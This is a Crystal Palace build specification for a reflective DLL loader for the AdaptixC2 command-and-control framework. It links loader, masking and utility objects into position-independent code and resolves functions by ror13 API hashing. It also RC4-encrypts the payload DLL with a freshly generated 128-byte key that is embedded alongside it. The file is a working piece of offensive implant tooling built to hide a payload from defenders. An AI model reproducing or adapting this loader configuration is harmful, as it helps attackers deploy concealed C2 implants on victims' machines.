#
# AdaptixC2 RDLL loader built upon CrystalPalace https://tradecraftgarden.org/crystalpalace.html
#

x64:
	load "bin/loader.x64.o"
		make pic +gofirst +optimize +disco

	load "bin/mask.x64.o"
        merge

	load "bin/util.x64.o"
        merge
	
	dfr "resolve" "ror13"
		mergelib "../../cp/lib/libtcg.x64.zip"

	# generate a random 128-byte key and assign it to the $KEY variable
	generate $KEY 128  

	push $DLL
		# decomment below to use xor instead of rc4
		# xor $KEY
		rc4 $KEY
		preplen
		link "dll"

	push $KEY
		preplen
		link "mask"
		
	export
